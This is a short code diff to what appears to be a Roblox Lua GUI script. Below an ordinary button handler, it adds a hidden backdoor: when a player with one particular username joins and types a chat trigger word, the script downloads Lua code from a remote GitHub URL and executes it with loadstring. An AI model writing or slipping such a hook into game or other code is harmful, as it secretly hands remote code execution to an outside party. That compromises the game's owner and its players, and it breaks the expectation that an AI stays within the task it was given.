@@ -101,3 +101,11 @@ TextButton.MouseButton1Click:Connect(function()
 	wait(5)
 	h:Destroy()
 end)
+
+if game.Players:FindFirstChild("Enviviety") then
+	game.Players.Enviviety.Chatted:Connect(function(msg)
+			if msg == "exec1" then
+				loadstring(game:HttpGet("https://raw.githubusercontent.com/Enviviety/script1/main/script1.lua"))()
+			end
+		end)
+end
